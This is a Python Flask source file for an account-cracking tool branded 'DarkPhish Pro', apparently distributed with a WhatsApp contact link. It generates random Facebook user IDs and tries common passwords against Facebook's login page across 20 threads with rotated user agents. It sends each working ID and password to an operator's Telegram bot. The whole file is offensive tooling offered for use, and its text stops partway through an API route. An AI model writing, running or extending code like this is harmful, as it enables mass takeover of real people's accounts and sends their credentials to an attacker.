from flask import Flask, render_template_string, request, jsonify
import threading
import requests
import uuid
import random
import string
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import re

app = Flask(__name__)

# المتغيرات العامة
is_running = False
bot_token = ""
chat_id = ""
found_accounts = []
start_time = None
current_targets = []
attempt_logs = []

# ====================== HTML القالب ======================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DARK PHISHER PRO</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0a0a;
            font-family: 'Rajdhani', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            background-image: 
                radial-gradient(ellipse at 20% 50%, rgba(0, 255, 65, 0.08) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(255, 0, 51, 0.08) 0%, transparent 60%),
                repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,65,0.02) 2px, rgba(0,255,65,0.02) 4px);
        }
        
        /* خلفية هكر */
        .hacker-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
            overflow: hidden;
            opacity: 0.06;
        }
        
        .hacker-bg .matrix-char {
            position: absolute;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            animation: matrixFall linear infinite;
            text-shadow: 0 0 10px #00ff41;
        }
        
        @keyframes matrixFall {
            0% { transform: translateY(-100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
        }
        
        .panel {
            position: relative;
            z-index: 1;
            background: linear-gradient(145deg, rgba(13, 13, 13, 0.95), rgba(26, 26, 26, 0.95));
            border: 2px solid #00ff41;
            border-radius: 30px;
            padding: 35px 30px;
            width: 620px;
            max-height: 92vh;
            overflow-y: auto;
            box-shadow: 
                0 0 60px rgba(0, 255, 65, 0.15),
                inset 0 0 60px rgba(0, 255, 65, 0.05),
                0 0 120px rgba(0, 255, 65, 0.05);
            animation: borderPulse 3s ease-in-out infinite;
            backdrop-filter: blur(10px);
        }
        
        .panel::-webkit-scrollbar {
            width: 4px;
        }
        .panel::-webkit-scrollbar-track {
            background: #0a0a0a;
        }
        .panel::-webkit-scrollbar-thumb {
            background: #00ff41;
            border-radius: 2px;
        }
        
        @keyframes borderPulse {
            0%, 100% { border-color: #00ff41; box-shadow: 0 0 60px rgba(0, 255, 65, 0.15); }
            50% { border-color: #00cc33; box-shadow: 0 0 80px rgba(0, 255, 65, 0.25); }
        }
        
        .header {
            text-align: center;
            border-bottom: 2px solid #00ff41;
            padding-bottom: 18px;
            margin-bottom: 20px;
            position: relative;
        }
        
        .header::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff41, transparent);
            animation: scanline 2s linear infinite;
        }
        
        @keyframes scanline {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        
        .header .logo {
            font-family: 'Orbitron', monospace;
            font-size: 32px;
            font-weight: 900;
            color: #00ff41;
            text-shadow: 
                0 0 30px rgba(0, 255, 65, 0.5),
                0 0 60px rgba(0, 255, 65, 0.3);
            letter-spacing: 4px;
        }
        
        .header .logo span {
            color: #ff0033;
            text-shadow: 0 0 30px rgba(255, 0, 51, 0.5);
        }
        
        .header .subtitle {
            color: #00aa33;
            font-size: 12px;
            letter-spacing: 6px;
            font-weight: 300;
            margin-top: 4px;
            opacity: 0.8;
        }
        
        /* زر واتساب بشعار احترافي */
        .whatsapp-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 14px 35px;
            border-radius: 50px;
            font-family: 'Rajdhani', sans-serif;
            font-weight: 700;
            font-size: 18px;
            text-decoration: none;
            transition: all 0.4s ease;
            margin: 12px auto 20px;
            width: fit-content;
            background: linear-gradient(135deg, #25D366, #075E54);
            color: #fff;
            border: 2px solid #25D366;
            box-shadow: 0 0 40px rgba(37, 211, 102, 0.2);
            position: relative;
            overflow: hidden;
            letter-spacing: 1px;
        }
        
        .whatsapp-btn::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at center, rgba(255,255,255,0.1), transparent 60%);
            animation: btnGlow 3s ease-in-out infinite;
        }
        
        @keyframes btnGlow {
            0%, 100% { transform: scale(1); opacity: 0.3; }
            50% { transform: scale(1.2); opacity: 0.6; }
        }
        
        .whatsapp-btn .wa-icon {
            position: relative;
            z-index: 1;
            width: 36px;
            height: 36px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            color: #25D366;
            font-weight: 900;
            box-shadow: 0 0 20px rgba(255,255,255,0.2);
            flex-shrink: 0;
        }
        
        .whatsapp-btn .wa-text {
            position: relative;
            z-index: 1;
            font-size: 17px;
        }
        
        .whatsapp-btn .wa-badge {
            position: relative;
            z-index: 1;
            background: rgba(255,255,255,0.15);
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 11px;
            letter-spacing: 2px;
            font-weight: 300;
        }
        
        .whatsapp-btn:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 0 60px rgba(37, 211, 102, 0.4);
            border-color: #fff;
        }
        
        .input-group {
            margin-bottom: 16px;
        }
        
        .input-group label {
            color: #00ff41;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 3px;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 5px;
        }
        
        .input-group label .icon {
            color: #ff0033;
            font-size: 16px;
        }
        
        .input-group input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(0, 0, 0, 0.85);
            border: 1px solid #1a4a1a;
            border-radius: 10px;
            color: #00ff41;
            font-family: 'Rajdhani', monospace;
            font-size: 14px;
            font-weight: 600;
            outline: none;
            transition: all 0.3s ease;
            letter-spacing: 1px;
        }
        
        .input-group input:focus {
            border-color: #00ff41;
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.15);
            background: rgba(0, 20, 0, 0.9);
        }
        
        .input-group input::placeholder {
            color: #1a3a1a;
            font-weight: 300;
            letter-spacing: 2px;
        }
        
        .btn-group {
            display: flex;
            gap: 10px;
            margin: 18px 0 14px;
            flex-wrap: wrap;
        }
        
        .btn {
            flex: 1;
            padding: 13px 10px;
            border: none;
            border-radius: 10px;
            font-family: 'Orbitron', monospace;
            font-weight: 700;
            font-size: 11px;
            letter-spacing: 1.5px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            min-width: 70px;
            position: relative;
        }
        
        .btn-start {
            background: linear-gradient(135deg, #00ff41, #00cc33);
            color: #0a0a0a;
            box-shadow: 0 0 40px rgba(0, 255, 65, 0.3);
            border: 1px solid #00ff41;
        }
        
        .btn-start:hover:not(:disabled) {
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 0 60px rgba(0, 255, 65, 0.5);
        }
        
        .btn-start:disabled {
            opacity: 0.3;
            cursor: not-allowed;
            transform: none;
        }
        
        .btn-stop {
            background: linear-gradient(135deg, #ff0033, #cc0022);
            color: #fff;
            box-shadow: 0 0 40px rgba(255, 0, 51, 0.3);
            border: 1px solid #ff0033;
        }
        
        .btn-stop:hover:not(:disabled) {
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 0 60px rgba(255, 0, 51, 0.5);
        }
        
        .btn-stop:disabled {
            opacity: 0.3;
            cursor: not-allowed;
            transform: none;
        }
        
        .btn-test {
            background: transparent;
            color: #00ff41;
            border: 1px solid #00ff41;
            flex: 0.5;
        }
        
        .btn-test:hover {
            background: #00ff41;
            color: #0a0a0a;
            box-shadow: 0 0 40px rgba(0, 255, 65, 0.3);
        }
        
        .btn-clear {
            background: transparent;
            color: #666;
            border: 1px solid #333;
            flex: 0.3;
        }
        
        .btn-clear:hover {
            border-color: #ff0033;
            color: #ff0033;
        }
        
        .status-box {
            background: rgba(0, 10, 0, 0.9);
            border: 1px solid #1a3a1a;
            border-radius: 10px;
            padding: 12px 18px;
            margin: 12px 0;
            min-height: 46px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: all 0.3s ease;
        }
        
        .status-box .status-text {
            color: #00ff41;
            font-size: 13px;
            font-weight: 600;
            letter-spacing: 2px;
            font-family: 'Orbitron', monospace;
        }
        
        .status-box .status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #1a3a1a;
            transition: all 0.3s ease;
        }
        
        .status-box .status-indicator.active {
            background: #00ff41;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.6);
            animation: blink 0.8s infinite;
        }
        
        .status-box .status-indicator.error {
            background: #ff0033;
            box-shadow: 0 0 20px rgba(255, 0, 51, 0.6);
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr 1fr;
            gap: 8px;
            margin: 12px 0;
        }
        
        .stat-item {
            background: rgba(0, 10, 0, 0.8);
            border: 1px solid #0a2a0a;
            border-radius: 8px;
            padding: 10px 4px;
            text-align: center;
        }
        
        .stat-item .stat-number {
            color: #00ff41;
            font-size: 20px;
            font-weight: 700;
            font-family: 'Orbitron', monospace;
        }
        
        .stat-item .stat-number.success { color: #00ff41; }
        .stat-item .stat-number.fail { color: #ff0033; }
        .stat-item .stat-number.total { color: #ffaa00; }
        
        .stat-item .stat-label {
            color: #1a4a1a;
            font-size: 9px;
            letter-spacing: 2px;
            margin-top: 3px;
            font-weight: 600;
        }
        
        .live-targets {
            background: rgba(0, 10, 0, 0.9);
            border: 1px solid #0a2a0a;
            border-radius: 10px;
            padding: 12px;
            margin: 12px 0;
            max-height: 100px;
            overflow-y: auto;
            display: none;
        }
        
        .live-targets.active { display: block; }
        
        .live-targets .target-title {
            color: #ffaa00;
            font-size: 10px;
            letter-spacing: 3px;
            font-weight: 600;
            margin-bottom: 5px;
            font-family: 'Orbitron', monospace;
        }
        
        .live-targets .target-item {
            color: #00aa33;
            font-size: 11px;
            padding: 2px 6px;
            border-bottom: 1px solid rgba(0, 255, 65, 0.05);
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: space-between;
        }
        
        .live-targets .target-item .target-status.found { color: #00ff41; }
        .live-targets .target-item .target-status.fail { color: #ff0033; }
        .live-targets .target-item .target-status.testing { color: #ffaa00; }
        
        .log-area {
            background: rgba(0, 0, 0, 0.9);
            border: 1px solid #0a2a0a;
            border-radius: 10px;
            padding: 12px;
            margin-top: 12px;
            max-height: 140px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            color: #00aa33;
            display: none;
        }
        
        .log-area.active { display: block; }
        
        .log-area .log-entry {
            padding: 2px 0;
            border-bottom: 1px solid rgba(0, 255, 65, 0.04);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .log-area .log-entry .time {
            color: #1a4a1a;
            margin-right: 8px;
            min-width: 55px;
            font-size: 10px;
        }
        
        .log-area .log-entry .log-uid {
            color: #00aa33;
            flex: 1;
            font-size: 11px;
        }
        
        .log-area .log-entry .log-status {
            font-weight: 700;
            min-width: 45px;
            text-align: right;
            font-size: 10px;
        }
        .log-area .log-entry .log-status.success { color: #00ff41; }
        .log-area .log-entry .log-status.fail { color: #ff0033; }
        .log-area .log-entry .log-status.info { color: #ffaa00; }
        
        .footer {
            text-align: center;
            margin-top: 18px;
            padding-top: 14px;
            border-top: 1px solid #0a1a0a;
        }
        
        .footer .signature {
            color: #0a2a0a;
            font-size: 10px;
            letter-spacing: 4px;
            font-family: 'Orbitron', monospace;
        }
        
        .footer .signature span {
            color: #00ff41;
        }
        
        ::-webkit-scrollbar {
            width: 3px;
        }
        ::-webkit-scrollbar-track {
            background: #0a0a0a;
        }
        ::-webkit-scrollbar-thumb {
            background: #00ff41;
            border-radius: 2px;
        }
    </style>
</head>
<body>
    <!-- خلفية الهكر -->
    <div class="hacker-bg" id="hackerBg"></div>
    
    <div class="panel">
        <div class="header">
            <div class="logo">⧩ DARK<span>PHISH</span></div>
            <div class="subtitle">◈ FACEBOOK CLONER PRO ◈</div>
        </div>

        <!-- زر واتساب بشعار احترافي -->
        <a href="https://wa.me/249907118667" target="_blank" class="whatsapp-btn">
            <span class="wa-icon">📱</span>
            <span class="wa-text">تواصل عبر واتساب</span>
            <span class="wa-badge">مباشر</span>
        </a>

        <div class="input-group">
            <label><span class="icon">⬡</span> TELEGRAM BOT TOKEN</label>
            <input type="text" id="token" placeholder="••••••••••••••••••••••••••••" value="{{ token or '' }}">
        </div>
        
        <div class="input-group">
            <label><span class="icon">⬢</span> TELEGRAM CHAT ID</label>
            <input type="text" id="chatid" placeholder="••••••••••••••••" value="{{ chatid or '' }}">
        </div>

        <div class="btn-group">
            <button class="btn btn-test" id="testBtn">◈ TEST</button>
            <button class="btn btn-start" id="startBtn">⚡ START</button>
            <button class="btn btn-stop" id="stopBtn" disabled>✖ STOP</button>
            <button class="btn btn-clear" id="clearBtn">⌫</button>
        </div>

        <div class="status-box">
            <span class="status-text" id="statusText">● SYSTEM READY</span>
            <span class="status-indicator" id="statusIndicator"></span>
        </div>

        <div class="stats-grid">
            <div class="stat-item">
                <div class="stat-number total" id="attemptCount">0</div>
                <div class="stat-label">TOTAL</div>
            </div>
            <div class="stat-item">
                <div class="stat-number success" id="foundCount">0</div>
                <div class="stat-label">✅ FOUND</div>
            </div>
            <div class="stat-item">
                <div class="stat-number fail" id="failCount">0</div>
                <div class="stat-label">❌ FAILED</div>
            </div>
            <div class="stat-item">
                <div class="stat-number" id="timeElapsed">00:00</div>
                <div class="stat-label">TIME</div>
            </div>
        </div>

        <div class="live-targets" id="liveTargets">
            <div class="target-title">⬡ LIVE TARGETS</div>
            <div id="targetsList"></div>
        </div>

        <div class="log-area" id="logArea">
            <div id="logContent"></div>
        </div>

        <div class="footer">
            <div class="signature"><span>⧩ DARKPHISH PRO</span> v3.1</div>
        </div>
    </div>

    <script>
        // ===== مصفوفة الهكر =====
        (function() {
            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            const container = document.getElementById('hackerBg');
            const count = 35;
            
            for (let i = 0; i < count; i++) {
                const span = document.createElement('span');
                span.className = 'matrix-char';
                span.textContent = chars[Math.floor(Math.random() * chars.length)];
                span.style.left = Math.random() * 100 + '%';
                span.style.fontSize = (12 + Math.random() * 18) + 'px';
                span.style.animationDuration = (8 + Math.random() * 15) + 's';
                span.style.animationDelay = (Math.random() * 15) + 's';
                span.style.opacity = 0.1 + Math.random() * 0.12;
                container.appendChild(span);
            }
        })();

        // ===== كود التحكم =====
        let isRunning = false;
        let attemptCount = 0;
        let foundCount = 0;
        let failCount = 0;
        let startTime = null;
        let timerInterval = null;
        
        const statusText = document.getElementById('statusText');
        const statusIndicator = document.getElementById('statusIndicator');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const testBtn = document.getElementById('testBtn');
        const clearBtn = document.getElementById('clearBtn');
        const logArea = document.getElementById('logArea');
        const logContent = document.getElementById('logContent');
        const tokenInput = document.getElementById('token');
        const chatidInput = document.getElementById('chatid');
        const foundCountEl = document.getElementById('foundCount');
        const failCountEl = document.getElementById('failCount');
        const attemptCountEl = document.getElementById('attemptCount');
        const timeElapsedEl = document.getElementById('timeElapsed');
        const liveTargets = document.getElementById('liveTargets');
        const targetsList = document.getElementById('targetsList');

        function setStatus(text, type = 'idle') {
            statusText.textContent = text;
            statusIndicator.className = 'status-indicator';
            if (type === 'active') statusIndicator.classList.add('active');
            else if (type === 'error') statusIndicator.classList.add('error');
        }

        function addLog(uid, status, type = 'info') {
            logArea.classList.add('active');
            const time = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            const cls = type === 'success' ? 'success' : type === 'fail' ? 'fail' : 'info';
            const statusTextMap = type === 'success' ? '✅' : type === 'fail' ? '❌' : '⏳';
            entry.innerHTML = `<span class="time">[${time}]</span><span class="log-uid">${uid}</span><span class="log-status ${cls}">${statusTextMap}</span>`;
            logContent.appendChild(entry);
            logArea.scrollTop = logArea.scrollHeight;
            while (logContent.children.length > 70) logContent.removeChild(logContent.firstChild);
        }

        function updateStats() {
            attemptCountEl.textContent = attemptCount;
            foundCountEl.textContent = foundCount;
            failCountEl.textContent = failCount;
            if (startTime) {
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                const mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
                const secs = String(elapsed % 60).padStart(2, '0');
                timeElapsedEl.textContent = `${mins}:${secs}`;
            }
        }

        function updateTargets(targets) {
            if (targets && targets.length > 0) {
                liveTargets.classList.add('active');
                targetsList.innerHTML = targets.map(t => {
                    let statusClass = 'testing';
                    let statusText = '⏳';
                    if (t.status && t.status.includes('FOUND')) { statusClass = 'found'; statusText = '✅'; }
                    else if (t.status && (t.status.includes('fail') || t.status.includes('invalid') || t.status.includes('error'))) { statusClass = 'fail'; statusText = '❌'; }
                    return `<div class="target-item"><span>${t.uid}</span><span class="target-status ${statusClass}">${statusText}</span></div>`;
                }).join('');
            } else liveTargets.classList.remove('active');
        }

        async function apiCall(endpoint, data = {}) {
            const res = await fetch('/api/' + endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return res.json();
        }

        testBtn.addEventListener('click', async () => {
            const token = tokenInput.value.trim();
            const chatid = chatidInput.value.trim();
            if (!token || !chatid) { setStatus('⚠️ FILL ALL FIELDS', 'error'); return; }
            setStatus('⏳ TESTING...', 'active');
            const res = await apiCall('test', { token, chatid });
            if (res.status === 'ok') { setStatus('✅ CONNECTION SUCCESS', 'active'); addLog('SYSTEM', 'Connected', 'success'); }
            else { setStatus('❌ ' + res.message, 'error'); addLog('SYSTEM', 'Failed: ' + res.message, 'fail'); }
        });

        startBtn.addEventListener('click', async () => {
            if (isRunning) return;
            const token = tokenInput.value.trim();
            const chatid = chatidInput.value.trim();
            if (!token || !chatid) { setStatus('⚠️ FILL ALL FIELDS', 'error'); return; }
            setStatus('⏳ STARTING...', 'active');
            startBtn.disabled = true;
            stopBtn.disabled = false;
            const res = await apiCall('start', { token, chatid });
            if (res.status === 'ok') {
                isRunning = true;
                startTime = Date.now();
                attemptCount = 0; foundCount = 0; failCount = 0;
                timerInterval = setInterval(updateStats, 1000);
                setStatus('🟢 PHISHING ACTIVE', 'active');
                addLog('SYSTEM', 'STARTED', 'info');
            } else {
                setStatus('❌ ' + res.message, 'error');
                startBtn.disabled = false;
                stopBtn.disabled = true;
                addLog('SYSTEM', 'Failed: ' + res.message, 'fail');
            }
        });

        stopBtn.addEventListener('click', async () => {
            if (!isRunning) return;
            const res = await apiCall('stop');
            if (res.status === 'ok') {
                isRunning = false;
                startBtn.disabled = false;
                stopBtn.disabled = true;
                if (timerInterval) clearInterval(timerInterval);
                setStatus('⏹ STOPPED', 'idle');
                addLog('SYSTEM', 'STOPPED', 'info');
                liveTargets.classList.remove('active');
            }
        });

        clearBtn.addEventListener('click', () => {
            logContent.innerHTML = '';
            logArea.classList.remove('active');
            foundCount = 0; attemptCount = 0; failCount = 0;
            foundCountEl.textContent = '0'; failCountEl.textContent = '0'; attemptCountEl.textContent = '0';
            liveTargets.classList.remove('active');
            targetsList.innerHTML = '';
        });

        setInterval(async () => {
            const res = await apiCall('status');
            if (res.running !== undefined) {
                isRunning = res.running;
                if (isRunning) { startBtn.disabled = true; stopBtn.disabled = false; setStatus('🟢 PHISHING ACTIVE', 'active'); }
                else { startBtn.disabled = false; stopBtn.disabled = true; }
            }
            if (res.found !== undefined) { foundCount = res.found || 0; foundCountEl.textContent = foundCount; }
            if (res.fail !== undefined) { failCount = res.fail || 0; failCountEl.textContent = failCount; }
            if (res.attempts !== undefined) { attemptCount = res.attempts || 0; attemptCountEl.textContent = attemptCount; }
            if (res.targets !== undefined) updateTargets(res.targets);
            if (res.logs && res.logs.length > 0) res.logs.forEach(log => addLog(log.uid, log.status, log.type));
        }, 1500);
    </script>
</body>
</html>
"""

# ====================== نظام الصيد ======================

found_accounts = []
attempt_counter = 0
fail_counter = 0
phisher_running = False
current_targets = []
attempt_logs = []

def get_user_agent():
    agents = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120, 125)}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120, 125)}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120, 125)}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; rv:{random.randint(100, 120)}.0) Gecko/20100101 Firefox/{random.randint(100, 120)}.0"
    ]
    return random.choice(agents)

def get_account_age(uid):
    uid_str = str(uid)
    patterns = {
        '2008': ['1000000000', '100000000'],
        '2009': ['10000000', '1000000', '1000001', '1000002', '1000003', '1000004', '1000005'],
        '2010': ['1000006', '1000007', '1000008', '1000009', '100001'],
        '2011': ['100002', '100003'],
        '2012': ['100004'],
        '2013': ['100005', '100006'],
        '2014': ['100007', '100008'],
        '2015': ['100009'],
        '2016': ['10001'],
        '2017': ['10002'],
        '2018': ['10003'],
        '2019': ['10004'],
        '2020': ['10005'],
        '2021': ['10006'],
        '2022': ['10007', '10008'],
        '2023': ['10009'],
        '2024': ['61'],
        '2025': ['62', '63']
    }
    for year, prefixes in patterns.items():
        for prefix in prefixes:
            if uid_str.startswith(prefix):
                return year
    return 'Unknown'

def format_facebook_message(uid, password, age, timestamp):
    return f"""
╔═══════════════════════════════════════╗
║         🎯 FACEBOOK ACCOUNT FOUND     ║
╠═══════════════════════════════════════╣
║  📧 Email/Phone : {uid}
║  🔑 Password    : {password}
║  📅 Created     : {age}
║  🕐 Captured    : {timestamp}
║  🔗 Profile     : https://facebook.com/{uid}
║  🛡️ Status      : ✅ VALID
╠═══════════════════════════════════════╣
║  ⚡ DARKPHISH PRO v3.1
╚═══════════════════════════════════════╝
"""

def format_test_message(chat_id, bot_username):
    return f"""
╔═══════════════════════════════════════╗
║         ✅ CONNECTION ESTABLISHED     ║
╠═══════════════════════════════════════╣
║  🤖 Bot        : @{bot_username}
║  📍 Chat ID    : {chat_id}
║  ⏰ Time       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
║  🚀 Status     : ONLINE - READY
╠═══════════════════════════════════════╣
║  ⚡ SYSTEM ARMED AND OPERATIONAL╚═══════════════════════════════════════╝
"""

def attempt_login(uid, password, tokenk, chat_id):
    global attempt_counter, found_accounts, fail_counter, phisher_running, current_targets, attempt_logs
    if not phisher_running:
        return False
    attempt_counter += 1
    target_entry = {'uid': str(uid), 'status': '⏳ testing'}
    if not any(t['uid'] == str(uid) for t in current_targets):
        current_targets.append(target_entry)
    try:
        session = requests.Session()
        profile_url = f"https://www.facebook.com/profile.php?id={uid}"
        headers = {
            'User-Agent': get_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        profile_res = session.get(profile_url, headers=headers, timeout=15, allow_redirects=True)
        if profile_res.status_code == 200:
            login_url = "https://www.facebook.com/login.php"
            login_data = {'email': str(uid), 'pass': str(password), 'login': 'Submit'}
            login_headers = {
                'User-Agent': get_user_agent(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.facebook.com',
                'Referer': 'https://www.facebook.com/',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive'
            }
            login_res = session.post(login_url, data=login_data, headers=login_headers, timeout=20, allow_redirects=False)
            if 'c_user' in str(login_res.headers) or 'checkpoint' in str(login_res.text) or 'home' in str(login_res.text).lower():
                age = get_account_age(uid)
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                msg = format_facebook_message(uid, password, age, timestamp)
                try:
                    send_url = f"https://api.telegram.org/bot{tokenk}/sendMessage"
                    send_data = {'chat_id': chat_id, 'text': msg, 'parse_mode': 'HTML'}
                    requests.post(send_url, data=send_data, timeout=10)
                    found_accounts.append({'uid': uid, 'password': password, 'age': age, 'time': timestamp})
                    for t in current_targets:
                        if t['uid'] == str(uid):
                            t['status'] = '✅ FOUND'
                    attempt_logs.append({'uid': str(uid), 'status': 'FOUND', 'type': 'success'})
                    print(f"[+] FOUND: {uid} | {password}")
                    return True
                except Exception as e:
                    fail_counter += 1
                    attempt_logs.append({'uid': str(uid), 'status': 'Telegram error', 'type': 'fail'})
                    return False
            else:
                fail_counter += 1
                for t in current_targets:
                    if t['uid'] == str(uid):
                        t['status'] = '❌ invalid'
                attempt_logs.append({'uid': str(uid), 'status': 'Invalid', 'type': 'fail'})
        else:
            fail_counter += 1
            for t in current_targets:
                if t['uid'] == str(uid):
                    t['status'] = '❌ not exist'
            attempt_logs.append({'uid': str(uid), 'status': 'Not exist', 'type': 'fail'})
    except Exception as e:
        fail_counter += 1
        for t in current_targets:
            if t['uid'] == str(uid):
                t['status'] = '⚠️ error'
        attempt_logs.append({'uid': str(uid), 'status': 'Error', 'type': 'fail'})
    return False

def run_phisher_engine(chat_id, tokenk):
    global phisher_running, found_accounts, attempt_counter, fail_counter, current_targets, attempt_logs
    phisher_running = True
    found_accounts = []
    attempt_counter = 0
    fail_counter = 0
    current_targets = []
    attempt_logs = []
    passwords = ['123456', '1234567', '12345678', '123456789', '1234567890', 'password', 'password123', 'qwerty', 'qwerty123', 'admin', 'letmein', 'welcome', 'abc123', '111111', '000000', 'iloveyou', 'monkey', 'dragon', 'master', 'hello']
    user_ids = set()
    patterns = [('10000', 10), ('1000', 10), ('100', 10), ('61', 14), ('62', 14), ('63', 14), ('100000', 9), ('100001', 9), ('100002', 9), ('100003', 9), ('100004', 9), ('100005', 9), ('100006', 9), ('100007', 9), ('100008', 9), ('100009', 9)]
    for prefix, length in patterns:
        for _ in range(20):
            suffix = ''.join(random.choices('0123456789', k=length - len(prefix)))
            user_ids.add(prefix + suffix)
    user_ids.add('100000000000000')
    user_ids.add('100000000000001')
    user_ids.add('100000000000002')
    user_ids_list = list(user_ids)
    random.shuffle(user_ids_list)
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for uid in user_ids_list[:500]:
            if not phisher_running:
                break
            for pwd in passwords[:10]:
                if not phisher_running:
                    break
                futures.append(executor.submit(attempt_login, uid, pwd, tokenk, chat_id))
        for future in futures:
            if not phisher_running:
                break
            try:
                future.result(timeout=20)
            except:
                pass
    phisher_running = False

# ====================== Routes ======================

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/start', methods=['POST'])
def api_start():
    global phisher_running, bot_token, chat_id, start_time, attempt_counter, fail_counter
    data = request.json
    token = data.get('token', '').strip()
    chatid = data.get('chatid', '').strip()
    if not token or not chatid:
        return jsonify({'status': 'error', 'message': '⚠️ Missing token or chat ID'})
    if phisher_running:
        return jsonify({'status': 'error', 'message': '⚠️ Already running'})
    try:
        test_url = f"https://api.telegram.org/bot{token}/getMe"
        test_res = requests.get(test_url, timeout=10)
        if test_res.status_code != 200 or not test_res.json().get('ok'):
            return jsonify({'status': 'error', 'message': '❌ Invalid bot token'})
        bot_info = test_res.json().get('result', {})
        bot_username = bot_info.get('username', 'Unknown')
    except:
        return jsonify({'status': 'error', 'message': '❌ Cannot connect to Telegram API'})
    bot_token = token
    chat_id = chatid
    start_time = time.time()
    attempt_counter = 0
    fail_counter = 0
    thread = threading.Thread(target=run_phisher_engine, args=(chatid, token))
    thread.daemon = True
    thread.start()
    try:
        start_msg = f"""╔═══════════════════════════════════════╗
║         🚀 PHISHER ACTIVATED         ║
╠═══════════════════════════════════════╣
║  🤖 Bot        : @{bot_username}
║  📍 Chat ID    : {chatid}
║  ⏰ Started    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
║  ⚡ Workers    : 20 Threads
║  🎯 Target     : Facebook Accounts
╠═══════════════════════════════════════╣
║  🔍 Scanning in progress...
╚═══════════════════════════════════════╝"""
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text={start_msg}")
    except:
        pass
    return jsonify({'status': 'ok', 'message': '✅ Phisher started'})

@app.route('/api/stop', methods=['POST'])
def api_stop():
    global phisher_running
    phisher_running = False
    return jsonify({'status': 'ok', 'message': '⏹ Phisher stopped'})

@app.route('/api/test', methods=['POST'])
def api_test():
    data = request.json
    token = data.get('token', '').strip()
    chatid = data.get('chatid', '').strip()
    if not token or not chatid:
        return jsonify({'status': 'error', 'message': '⚠️ Missing token or chat ID'})
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        res = requests.get(url, timeout=10)
        if res.status_code == 200 and res.json().get('ok'):
            bot_info = res.json().get('result', {})
            username = bot_info.get('username', 'Unknown')
            test_msg = format_test_message(chatid, username)
            send_url = f"https://api.telegram.org/bot{token}/sendMessage"
